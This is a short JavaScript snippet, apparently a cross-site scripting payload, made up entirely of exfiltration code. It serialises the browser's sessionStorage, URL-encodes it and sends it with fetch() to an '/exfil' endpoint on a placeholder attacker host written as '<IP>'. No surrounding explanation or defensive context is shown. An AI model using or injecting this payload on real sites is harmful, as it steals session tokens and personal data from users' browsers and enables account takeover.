let data = JSON.stringify(sessionStorage)

let encodedData = encodeURIComponent(data)

fetch("http://<IP>/exfil?data=" + encodedData)
